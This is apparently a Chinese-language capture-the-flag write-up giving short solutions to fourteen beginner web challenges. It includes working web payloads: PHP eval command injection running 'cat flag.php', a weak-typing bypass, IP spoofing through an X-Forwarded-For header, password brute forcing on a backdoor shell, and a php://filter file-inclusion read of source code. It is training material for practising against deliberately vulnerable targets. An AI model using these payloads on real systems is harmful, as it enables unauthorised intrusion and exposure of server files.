# web1

F12查看源码，flag就在html源码中

# web2

题目叫我们输入验证，输入发现只能输入一个数字，F12查看源码，发现input处有长度限制，直接改html源码处的长度

# web3

```
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

简单的代码审计，易得`payload：?what=flag`

# web4

与上一题区别在于POST传递数据

# web5

```
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```

考察php语言特性，弱类型，易得`payload：?num=1a`

# web6

查看题目，不断弹窗，禁用Javascript，F12查看html源码，发现一串以`&#`开头的是HTML实体，`$#+ASCII+;`，Unicode解码

# web7

打卡发现页面不断刷新，用BP抓包，不断forward，直到刷新出源码有flag的页面(包的长度不同)。或者禁用js，手动刷新，直到出现flag页面

# web8

```php
<?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?>
```

代码审计，显然flag在flag.php中，所以很容易构造`payload：?hello=system('cat flag.php')`

# web9

```php
flag In the variable ! 
<?php  
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

代码审计，它提示了flag在变量中，过滤了除`\w`以外的东西，又看到$$args，想到$GLOBALS，所以构造`payload：?args=GLOBALS`

# web10

打开题目，发现显示“什么都没有”，提示“头等舱”，不明所以，用BP抓包发送，发现响应(Response)头中有flag

# web11

题目提示有后门，用dirsearch工具爆破目录，发现有`shell.php`，进入发现要密码，BP抓包，用字典爆破密码，最后爆破出密码是`hack`

# web12

题目提示“本地管理员”，输入`username`和`password`，显示IP禁止访问，联想“本地”，BP抓包，请求头中添加`X-Forwarded-For:127.0.0.1`，F12查看网页源码，发现<!-- dGVzdDEyMw== -->，base64解码得`test123`，“管理员”联想`username=admin`，`password=test123`，成功拿到flag

# web13

题目提示看源代码，F12查看，看到一段JS代码

```javascript
<script>
var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';
var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';
eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));
</script>
```

url解码得eval里的内容

```javascript
function checkSubmit()
{
    var a=document.getElementById("password");
	if("undefined"!=typeof a){
        if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
    		return!0;alert("Error");a.focus();return!1
    }
}		
document.getElementById("levelQuest").onsubmit=checkSubmit;
```

JS代码审计，输入`67d709b2b54aa2aa648cf6e87a7114f1`，拿到flag

# web14

打卡题目，有一个点击事件，点击跳转，回显`index.php`，且`http://114.67.246.176:10703/index.php?file=show.php`，想到用PHP封装协议读取源码，`payload：?file=php://filter/read=convert.base64-encode/resource=index.php`，然后base64解码，源码注释中得到flag



